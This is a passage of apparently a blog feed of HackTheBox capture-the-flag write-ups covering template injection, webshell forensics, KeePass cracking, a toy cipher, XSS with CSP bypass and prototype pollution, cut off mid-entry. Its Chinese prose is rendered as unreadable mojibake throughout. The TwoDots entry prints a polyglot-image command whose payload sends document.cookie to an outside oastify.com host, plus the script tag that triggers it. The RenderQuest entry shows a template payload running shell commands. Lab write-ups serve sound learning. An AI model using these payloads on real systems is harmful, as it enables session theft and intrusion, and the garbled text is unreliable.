alt="template"></p><p>å¾ˆå¥½ï¼Œæ¨¡æ¿ç”Ÿæ•ˆäº†ã€‚çœ‹åˆ°è¿™ç§é¢˜ç›®ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„ï¼Œå°±æ˜¯æ¨¡æ¿æ³¨å…¥ã€‚æ£€æŸ¥æºç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æºç ä¸­åˆšå¥½å®šä¹‰äº†å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹æ³•ï¼š</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-2.png" alt="exec"></p><p>å¹¶ä¸”è¿™ä¸ªæ–¹æ³•æ²¡æœ‰å¯¹ä¼ å…¥çš„å‚æ•°åšä»»ä½•è¿‡æ»¤ã€‚é‚£ä¹ˆï¼Œåé¢çš„äº‹æƒ…å°±ç®€å•äº†ã€‚</p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>æ„é€ PayloadæŸ¥çœ‹flagæ–‡ä»¶çš„æ–‡ä»¶åï¼š</p><pre><code class="HTML">    &lt;h2&gt;Get Flag&lt;/h2&gt;    &lt;ul&gt;        &lt;li&gt;Flag: &#123;&#123;.FetchServerInfo "ls /"&#125;&#125;&lt;/li&gt;    &lt;/ul&gt;</code></pre><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-3.png" alt="flag-file"></p><p>è¯»å–Flag(è¿™ä¸€æ­¥Payloadå°±ä¸ç”¨å¤šè¯´äº†å§)ï¼š</p><p><img src="/2023/09/25/HackTheBox-RenderQuest-WriteUP/image-4.png" alt="flag"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>æ„Ÿè°¢ChatGPT</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://xz.aliyun.com/t/12642">Goè¯­è¨€ä¸‹çš„æ¨¡æ¿æ³¨å…¥</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> Golangæ¨¡æ¿æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Obscure WriteUP</title>
      <link href="/2023/09/12/HackTheBox-Obscure-WriteUP/"/>
      <url>/2023/09/12/HackTheBox-Obscure-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><blockquote><p>An attacker has found a vulnerability in our web server that allows arbitrary PHP file upload in our Apache server. Suchlike, the hacker has uploaded a what seems to be like an obfuscated shell (support.php). We monitor our network 24&#x2F;7 and generate logs from tcpdump (we provided the log file for the period of two minutes before we terminated the HTTP service for investigation), however, we need your help in analyzing and identifying commands the attacker wrote to understand what was compromised.</p></blockquote><p>ç¿»è¯‘ï¼š</p><blockquote><p>æ”»å‡»è€…åœ¨æˆ‘ä»¬çš„ Web æœåŠ¡å™¨ä¸­å‘ç°äº†ä¸€ä¸ªæ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸åœ¨æˆ‘ä»¬çš„ Apache æœåŠ¡å™¨ä¸­ä¸Šä¼ ä»»æ„ PHP æ–‡ä»¶ã€‚ ä¾‹å¦‚ï¼Œé»‘å®¢ä¸Šä¼ äº†ä¸€ä¸ªçœ‹èµ·æ¥åƒæ˜¯æ··æ·†çš„ shell (support.php)ã€‚ æˆ‘ä»¬24&#x2F;7ç›‘æ§æˆ‘ä»¬çš„ç½‘ç»œå¹¶ä»tcpdumpç”Ÿæˆæ—¥å¿—ï¼ˆæˆ‘ä»¬åœ¨ç»ˆæ­¢HTTPæœåŠ¡è¿›è¡Œè°ƒæŸ¥ä¹‹å‰æä¾›äº†ä¸¤åˆ†é’Ÿçš„æ—¥å¿—æ–‡ä»¶ï¼‰ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦æ‚¨çš„å¸®åŠ©æ¥åˆ†æå’Œè¯†åˆ«æ”»å‡»è€…ç¼–å†™çš„å‘½ä»¤ä»¥ç†è§£ ä»€ä¹ˆå—åˆ°äº†æŸå®³ã€‚</p></blockquote><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image.png" alt="challenge"></p><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªPHPçš„WebShellæ–‡ä»¶ï¼Œå’Œä¸€æ®µæµé‡ã€‚</p><h2 id="æ€è·¯-è§£é¢˜"><a href="#æ€è·¯-è§£é¢˜" class="headerlink" title="æ€è·¯ &amp; è§£é¢˜"></a>æ€è·¯ &amp; è§£é¢˜</h2><h3 id="WebShellåˆ†æ"><a href="#WebShellåˆ†æ" class="headerlink" title="WebShellåˆ†æ"></a>WebShellåˆ†æ</h3><p>é¦–å…ˆçœ‹é¢˜ç›®ç»™çš„WebShellï¼Œå¾ˆæ˜æ˜¾è¢«æ··æ·†è¿‡äº†ï¼Œä½†æ˜¯æ˜¯å¾ˆç®€å•çš„æ··æ·†ï¼š</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-1.png" alt="WebShell"></p><p>å¤§ä½“é€»è¾‘æ˜¯ï¼Œå°†è‹¥å¹²å­—ç¬¦ä¸²æ‹¼æ¥å¹¶åˆ é™¤æ‰å­—ç¬¦ä¸²ä¸­çš„å¹²æ‰°å­—ç¬¦ï¼ˆç¬¬8è¡Œä»£ç ï¼‰ï¼Œç„¶åä½œä¸ºä¸€ä¸ªæ–°å‡½æ•°æ‰§è¡Œã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦<code>echo $u;</code>ï¼Œå°±å¯ä»¥å¾—åˆ°çœŸå®çš„ä»£ç ï¼š</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-2.png" alt="edited"></p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-3.png" alt="realcode"></p><p>éšä¾¿æ‰¾ä¸ªåœ¨çº¿ç½‘ç«™ä¼˜åŒ–ä¸€ä¸‹æ ¼å¼ï¼š</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-4.png" alt="beautifier"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ä»£ç çš„åŸºæœ¬é€»è¾‘ï¼šå®šä¹‰äº†ä¸€ä¸ª<code>xor</code>åŠ å¯†çš„å‡½æ•°ï¼Œå°†ä¼ å…¥çš„æ•°æ®è¿›è¡Œ<code>xor</code>+<code>base64</code>+<code>gzuncompress</code>ä¸‰å±‚å¤„ç†ï¼Œç„¶åæ‰§è¡Œå¤„ç†åçš„ä»£ç ã€‚</p><p>ä¹‹åæˆ‘ä»¬åªéœ€è¦ä»æµé‡ä¸­æ‰¾åˆ°æ”»å‡»è€…çš„æ”»å‡»æµé‡ï¼Œç„¶åè¿˜åŸæ”»å‡»è€…æ‰§è¡Œçš„ä»£ç ï¼Œå³å¯åˆ¤æ–­å‡ºæ”»å‡»è€…çš„è¡Œä¸ºã€‚è¿™é‡Œæˆ‘ä»¬å…ˆç¨ç¨æ”¹åŠ¨ä¸€ä¸‹ä»£ç ï¼Œç›´æ¥æŠŠè§£å¯†åçš„ä»£ç echoå‡ºæ¥ï¼Œç„¶åæŠŠæ”¹åŠ¨åçš„ä»£ç ä¸Šä¼ åˆ°æˆ‘ä»¬è‡ªå·±çš„PHPæœåŠ¡å™¨ä¸Šã€‚æ”¹åŠ¨åçš„ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-5.png" alt="poc"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹æµé‡ã€‚</p><h3 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h3><p>æ—¢ç„¶çŸ¥é“äº†WebShellçš„æ–‡ä»¶åï¼Œé‚£ä¹ˆç”¨<code>http.request.uri contains &quot;support.php&quot;</code>å¯ä»¥å¾ˆè½»æ¾çš„ç­›é€‰å‡ºæ”»å‡»è€…çš„æ”»å‡»è®°å½•ï¼š</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-6.png" alt="1"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åªéœ€è¦é‡å‘æ”»å‡»è€…çš„æ”»å‡»æµé‡åˆ°æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œå°±å¯ä»¥çœ‹åˆ°æ”»å‡»è€…çš„æ“ä½œè®°å½•ã€‚åœ¨æ”»å‡»è€…çš„æœ€åä¸€æ¬¡æ“ä½œè®°å½•ä¸­ï¼Œæˆ‘ä»¬å‘ç°æ”»å‡»è€…æ‹·è´èµ°äº†æœ¬åœ°çš„Keepasså¯†ç æ•°æ®åº“ï¼š</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-7.png" alt="2"></p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-8.png" alt="3"></p><p>å› ä¸ºåŠ è§£å¯†æµç¨‹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠæ”»å‡»è€…è·å–çš„Responseæ•°æ®ä½œä¸ºRequeståŒ…çš„æ•°æ®æµå‘é€ï¼Œå°±å¯ä»¥è·å¾—Keepassæ•°æ®åº“æ–‡ä»¶çš„base64ç¼–ç ï¼š</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-9.png" alt="keepass_base64"></p><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥è¿˜åŸå‡ºæ–‡ä»¶æœ¬ä½“ï¼š</p><pre><code class="bash">cat base64.txt |base64 -d &gt; pwdb.kdbx</code></pre><h3 id="ç ´è§£Keepassæ•°æ®åº“"><a href="#ç ´è§£Keepassæ•°æ®åº“" class="headerlink" title="ç ´è§£Keepassæ•°æ®åº“"></a>ç ´è§£Keepassæ•°æ®åº“</h3><p>ä½¿ç”¨john The Ripperæå–hashï¼š</p><pre><code class="bash">keepass2john pwdb.kdbx &gt;hash.txt</code></pre><p>ç„¶åç ´è§£ï¼š</p><p><img src="/2023/09/12/HackTheBox-Obscure-WriteUP/image-10.png" alt="crack"></p><p>æœ€åæ‰“å¼€Keepassæ•°æ®åº“è·å¾—Flagå³å¯ï¼ˆKeepassä¸å…è®¸æˆªå›¾ï¼Œå°±ä¸æˆªäº†ï¼‰ã€‚</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ä¸éš¾ï¼Œä½†æ˜¯æŒºæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œéœ€è¦çš„æŠ€èƒ½æ²¡æœ‰é‚£ä¹ˆæ·±ï¼Œä½†æ˜¯è€ƒç‚¹è¿˜æŒºæ‚çš„ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox BabyEncryption WriteUp</title>
      <link href="/2023/09/11/HackTheBox-BabyEncryption-WriteUp/"/>
      <url>/2023/09/11/HackTheBox-BabyEncryption-WriteUp/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><blockquote><p>You are after an organised crime group which is responsible for the illegal weapon market in your country. As a secret agent, you have infiltrated the group enough to be included in meetings with clients. During the last negotiation, you found one of the confidential messages for the customer. It contains crucial information about the delivery. Do you think you can decrypt it?</p></blockquote><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¢˜ç›®ç»™å‡ºäº†å¯†æ–‡å’ŒåŠ å¯†ä»£ç ï¼ŒåŠ å¯†ä»£ç å¦‚ä¸‹ï¼š</p><pre><code class="python">import stringfrom secret import MSGdef encryption(msg):    ct = []    for char in msg:        ct.append((123 * char + 18) % 256)    return bytes(ct)ct = encryption(MSG)f = open(&#39;./msg.enc&#39;,&#39;w&#39;)f.write(ct.hex())f.close()</code></pre><p>å¯ä»¥çœ‹å‡ºæ˜¯å¯¹åŸæ–‡çš„ASCIIç è¿›è¡Œäº†ä¸€äº›è®¡ç®—ã€‚è€ƒè™‘åˆ°ASCIIç çš„å–å€¼èŒƒå›´ä¹Ÿå°±é‚£ä¹ˆå¤§ï¼Œç›´æ¥æŠŠåŸæœ‰çš„åŠ å¯†æ–¹å¼æŠ„è¿‡æ¥ç„¶åéå†å°±å¥½äº†ã€‚</p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>è§£å¯†ä»£ç ï¼š</p><pre><code class="python">msg = open(&#39;msg.enc&#39;,&#39;r&#39;).readline()def judge(byte):    for i in range(0,255,1):        x = ((123 * i + 18) % 256)        if x == byte:            return chr(i)bts = bytes.fromhex(msg)flag = &#39;&#39;for byte in bts:    flag += judge(byte)print(flag)</code></pre><p><img src="/2023/09/11/HackTheBox-BabyEncryption-WriteUp/image-1.png" alt="flag"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ç¬¬ä¸€é“Cryptoé¢˜ç›®ï¼ŒæŒºç®€å•çš„ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox TwoDots horror WriteUP</title>
      <link href="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/"/>
      <url>/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><blockquote><p>Everything starts from a dot and builds up to two. Uniting them is like a kiss in the dark from a stranger. Made up horrors to help you cope with the real ones, join us to take a bite at the two-sentence horror stories on our very own TwoDots Horrorâ„¢ blog.</p></blockquote><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image.png" alt="challenge"></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¦–å…ˆæˆ‘ä»¬æ¢³ç†ä¸€ä¸‹ç½‘ç«™çš„åŠŸèƒ½ï¼Œéå¸¸æ¸…æ™°ï¼šæ³¨å†Œç”¨æˆ·ã€ç”¨æˆ·ç™»å½•ã€å‘è¡¨å¸–å­ã€ä¸Šä¼ å¤´åƒã€ç”¨æˆ·ç™»å‡ºã€‚</p><p>æ¥ä¸‹æ¥æ¢³ç†ä»£ç ã€‚</p><p><code>flag</code>çš„ä½ç½®åœ¨<code>/bot.js</code>ä¸­ï¼š</p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-1.png" alt="flag"></p><p>ç»“åˆå‡½æ•°<code>purgeData(db)</code>ï¼Œbotä¼šä¸»åŠ¨è®¿é—®ç½‘ç«™çš„é¡µé¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ€ç»ˆå¤§æ¦‚ç‡éœ€è¦é€šè¿‡XSSæ¥è·å–botçš„cookieã€‚</p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬æ¥çœ‹<code>/review</code>çš„æ¨¡æ¿ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image9.png" alt="safe"></p><blockquote><p><strong>safe</strong> è¿‡æ»¤å™¨é€šå¸¸åœ¨å„ç§æ¨¡æ¿å¼•æ“ä¸­ç”¨äºæ ‡è®°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸ºâ€å®‰å…¨çš„â€ï¼Œè¿™æ„å‘³ç€è¯¥å­—ç¬¦ä¸²ä¸åº”è¯¥è¢«è½¬ä¹‰ã€‚ â€”â€”ChatGPT</p></blockquote><p>é‚£ä¹ˆï¼Œæ¿ä¸Šé’‰é’‰çš„ï¼Œ<code>&#123;&#123; post.content|safe &#125;&#125;</code>ä½ç½®å­˜åœ¨XSSæ¼æ´ã€‚åç»­çš„æ€è·¯ï¼Œå°±æ˜¯æ„é€ payloadï¼Œå†™å…¥è¿™ä¸ªä½ç½®ï¼Œå¹¶ä¸”åˆ©ç”¨ã€‚</p><p>åˆ©ç”¨çš„éš¾ç‚¹åœ¨äºï¼Œç½‘ç«™å¼€å¯äº†CSP(å†…å®¹å®‰å…¨ç­–ç•¥ï¼ŒContent Security Policy)ã€‚</p><blockquote><p>CSPï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼ŒContent Security Policyï¼‰æ˜¯ä¸€ä¸ªå®‰å…¨ç‰¹æ€§ï¼Œç”¨äºé˜²æ­¢å„ç§å¸¸è§çš„è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å’Œå…¶ä»–ä»£ç æ³¨å…¥æ”»å‡»ã€‚CSP å…è®¸ç½‘ç«™ç®¡ç†å‘˜æŒ‡å®šå“ªäº›å†…å®¹æºï¼ˆä¾‹å¦‚ JavaScriptã€CSSã€å›¾ç‰‡ç­‰ï¼‰æ˜¯å¯ä¿¡çš„ï¼Œä»è€Œæ§åˆ¶ç½‘é¡µå¯ä»¥åŠ è½½å’Œæ‰§è¡Œå“ªäº›èµ„æºã€‚<br>CSP æ˜¯é€šè¿‡ HTTP å“åº”å¤´ Content-Security-Policy æˆ–ç­‰æ•ˆçš„ <meta> å…ƒç´ åœ¨ HTML ä¸­å®ç°çš„ã€‚<br>â€”â€”â€”â€”ChatGPT</p></blockquote><p>è¿™é‡Œçš„ç­–ç•¥é™åˆ¶äº†ç½‘ç«™åªåŠ è½½åŒæºçš„èµ„æºï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•åŠ è½½å¤–éƒ¨çš„JSè„šæœ¬ï¼š</p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-2.png" alt="CSP"></p><p>æ—¢ç„¶ç½‘ç«™åªèƒ½åŠ è½½åŒæºçš„JSè„šæœ¬ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•å°†JSè„šæœ¬ä¸Šä¼ åˆ°ç½‘ç«™ä¸­ã€‚ä½œä¸ºä¸€ä¸ªé¶åœºï¼Œè¿™ä¸ªç½‘ç«™ç†è®ºä¸Šä¸ä¼šæœ‰å¤šä½™çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆä¸Šä¼ å¤´åƒçš„åŠŸèƒ½æˆ‘ä»¬ç†åº”å¯ä»¥åˆ©ç”¨çš„ä¸Šã€‚</p><p>å¤šæ–¹æŸ¥é˜…èµ„æ–™åï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è§£å†³è¿™ä¸ªé—®é¢˜çš„éªšæ“ä½œï¼šæŠŠJavaScriptä»£ç å†™å…¥å›¾ç‰‡ä¸­ï¼š<a href="https://github.com/s-3ntinel/imgjs_polygloter">https://github.com/s-3ntinel/imgjs_polygloter</a></p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªPOCï¼š</p><pre><code class="bash"># https://github.com/s-3ntinel/imgjs_polygloterpython3 img_polygloter.py jpg --height 666 --width 666 --payload &#39;window.location.href=&quot;http://rkfhc87j651n7m6f0va8pws5lwrnfc.oastify.com/grabber.php?c=&quot;+document.cookie;&#39; --output poc.jpg</code></pre><p>ç„¶åæ³¨å†Œç”¨æˆ·ï¼Œå°†POCä¸Šä¼ åˆ°å¤´åƒï¼š</p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-3.png" alt="upload"></p><p><code>åœ¨/routes/index.js</code>ä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸Šä¼ æ–‡ä»¶çš„è®¿é—®è·¯å¾„ï¼š</p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-4.png" alt="avatar"></p><p>ç”±æ­¤å¯ä»¥æ„é€ å‡ºXSSçš„POC(ä»¥ç”¨æˆ·åæ˜¯adminä¸ºä¾‹)ï¼š</p><pre><code class="HTML">&lt;script charset=&quot;ISO-8859-1&quot; src=&quot;/api/avatar/admin&quot;&gt;&lt;/script&gt;123.123.</code></pre><p>æäº¤å³å¯ï¼š</p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-5.png" alt="submit"></p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-6.png" alt="get-flag"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯payloadçš„ä½¿ç”¨æ–¹å¼ï¼Œéœ€è¦è®¾ç½®<code>charset=&quot;ISO-8859-1&quot;</code>å±æ€§ï¼Œå¦åˆ™çš„è¯JavaScriptä»£ç æ— æ³•åŠ è½½ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs">Bypassing CSP using polyglot JPEGs</a></li><li><a href="https://github.com/s-3ntinel/imgjs_polygloter">Image Polyglot</a></li><li><a href="https://salucci.ch/2023/05/20/xss-with-a-jpg-jpeg-to-bypass-csp/">XSS with a JPG&#x2F;JPEG to bypass CSP</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
            <tag> Bypass CSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox breaking grad WriteUP</title>
      <link href="/2023/09/04/HackTheBox-breaking-grad-WriteUP/"/>
      <url>/2023/09/04/HackTheBox-breaking-grad-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><blockquote><p>You and your buddy corrected the math in your physics teacherâ€™s paper on the decay of highly excited massive string states in the footnote of a renowned publication. Heâ€™s just failed your thesis out of spite, for making a fool out of him in the universityâ€™s research symposium. Now you canâ€™t graduate, unless you can do something about itâ€¦ ğŸ¤·</p></blockquote><blockquote><p>(æ‚¨å’Œæ‚¨çš„å¥½å‹åœ¨ä¸€æœ¬è‘—åå‡ºç‰ˆç‰©çš„è„šæ³¨ä¸­æ›´æ­£äº†ç‰©ç†è€å¸ˆå…³äºé«˜æ¿€å‘å¤§è´¨é‡å¼¦æ€è¡°å˜çš„è®ºæ–‡ä¸­çš„æ•°å­¦è®¡ç®—ã€‚ ä»–åªæ˜¯å‡ºäºæ¶æ„è€Œæ²¡é€šè¿‡ä½ çš„è®ºæ–‡ï¼Œå› ä¸ºä»–åœ¨å¤§å­¦çš„ç ”ç©¶ç ”è®¨ä¼šä¸Šå‡ºä¸‘äº†ã€‚ ç°åœ¨ä½ æ— æ³•æ¯•ä¸šï¼Œé™¤éä½ èƒ½åšç‚¹ä»€ä¹ˆâ€¦â€¦)</p></blockquote><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image.png" alt="Web"></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>Webé¡µé¢å¾ˆç®€å•ï¼Œç›®æ ‡ä¼¼ä¹æ˜¯é€šè¿‡æŸç§æ–¹å¼ï¼Œè®©æˆ‘ä»¬çš„ä¸»è§’é¡ºåˆ©æ¯•ä¸šã€‚åˆ†æä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ¯•ä¸šçš„æ¡ä»¶æœ‰ä¸¤ä¸ªï¼š</p><ol><li>Paperè¯„åˆ†å¤§äºç­‰äº10ï¼›</li><li>åå­—ä¸æ˜¯Bakeræˆ–è€…Purvisï¼›</li></ol><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-1.png" alt="pass"><br>å¾—ç½ªæ•™æˆæœç„¶æ²¡ä»€ä¹ˆå¥½ä¸‹åœºã€‚</p><p>ç©ç¬‘ç»“æŸï¼Œæˆ‘ä»¬æ¥åˆ†æä»£ç ã€‚å¯äº¤äº’çš„è·¯å¾„å°±ä¸¤ä¸ªï¼š<code>/debug/:action</code>å’Œ<code>/api/calculate</code></p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-2.png" alt="url"></p><p>é€šè¿‡è·Ÿè¸ªå‚æ•°çš„å¤„ç†è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¤§æ¦‚å¯ä»¥é”å®šæœ‰é—®é¢˜çš„ä»£ç åœ¨<code>challenge\helpers\ObjectHelper.js</code>ä¸­ï¼ˆå‡­ç›´è§‰ï¼‰ï¼š</p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-3.png" alt="oh"></p><p>å¦ç™½è®²æˆ‘å¯¹NodeJSä¸€çªä¸é€šï¼Œæ‰€ä»¥çœ‹ä¸å‡ºè¿™æ®µä»£ç æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬é—®é—®ä¸‡èƒ½çš„ChatGPTå§ã€‚</p><p>ä»¥ä¸‹æ˜¯ChatGPTçš„å›ç­”ï¼š</p><hr><p>è®©æˆ‘ä»¬é¦–å…ˆæŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ï¼Œç„¶åè¿›è¡Œåˆ†æã€‚</p><p>è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>ObjectHelper</code> çš„æ¨¡å—ï¼ŒåŒ…å«ä»¥ä¸‹å››ä¸ªæ–¹æ³•ï¼š</p><ol><li><p><strong>isObject(obj)</strong>:</p><ul><li>å‚æ•°: <code>obj</code>ï¼ˆä¸€ä¸ªä»»æ„ç±»å‹çš„å¯¹è±¡ï¼‰</li><li>è¿”å›å€¼: å¦‚æœ <code>obj</code> æ˜¯ä¸€ä¸ªå‡½æ•°æˆ–å¯¹è±¡ï¼Œè¿”å› <code>true</code>ï¼Œå¦åˆ™è¿”å› <code>false</code>ã€‚</li><li>ä½œç”¨: ç”¨äºæ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦æ˜¯å¯¹è±¡æˆ–å‡½æ•°ã€‚</li></ul></li><li><p><strong>isValidKey(key)</strong>:</p><ul><li>å‚æ•°: <code>key</code>ï¼ˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰</li><li>è¿”å›å€¼: å¦‚æœ <code>key</code> ä¸ç­‰äº <code>&#39;__proto__&#39;</code>ï¼Œåˆ™è¿”å› <code>true</code>ï¼Œå¦åˆ™è¿”å› <code>false</code>ã€‚</li><li>ä½œç”¨: ç”¨äºæ£€æŸ¥ä¸€ä¸ªé”®æ˜¯å¦æœ‰æ•ˆï¼Œä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢åŸå‹æ±¡æŸ“ã€‚</li></ul></li><li><p><strong>merge(target, source)</strong>:</p><ul><li>å‚æ•°: <code>target</code> å’Œ <code>source</code>ï¼ˆä¸¤ä¸ªå¯¹è±¡ï¼‰</li><li>è¿”å›å€¼: è¿”å›åˆå¹¶åçš„ <code>target</code> å¯¹è±¡ã€‚</li><li>ä½œç”¨: <ul><li>è¯¥æ–¹æ³•ç”¨äºå°† <code>source</code> å¯¹è±¡çš„å±æ€§åˆå¹¶åˆ° <code>target</code> å¯¹è±¡ä¸­ã€‚</li><li>å¦‚æœ <code>source</code> å¯¹è±¡çš„æŸä¸ªé”®åœ¨ <code>target</code> å¯¹è±¡ä¸­ä¹Ÿå­˜åœ¨ï¼Œå¹¶ä¸”å®ƒä»¬çš„å€¼éƒ½æ˜¯å¯¹è±¡ï¼Œåˆ™ä¼šé€’å½’åœ°åˆå¹¶è¿™ä¸¤ä¸ªå­å¯¹è±¡ã€‚</li><li>å¦åˆ™ï¼Œä¼šç›´æ¥å°† <code>source</code> å¯¹è±¡çš„å±æ€§å€¼èµ‹ç»™ <code>target</code> å¯¹è±¡çš„å¯¹åº”é”®ã€‚</li></ul></li></ul></li><li><p><strong>clone(target)</strong>:</p><ul><li>å‚æ•°: <code>target</code>ï¼ˆä¸€ä¸ªå¯¹è±¡ï¼‰</li><li>è¿”å›å€¼: è¿”å› <code>target</code> å¯¹è±¡çš„ä¸€ä¸ªæ·±æ‹·è´ã€‚</li><li>ä½œç”¨: <ul><li>è¯¥æ–¹æ³•ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œå¹¶å°† <code>target</code> å¯¹è±¡çš„å±æ€§å¤åˆ¶åˆ°æ–°å¯¹è±¡ä¸­ã€‚</li><li>ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œå®ƒå®é™…ä¸Šæ˜¯è°ƒç”¨äº† <code>merge</code> æ–¹æ³•ï¼Œå°†ä¸€ä¸ªç©ºå¯¹è±¡å’Œ <code>target</code> 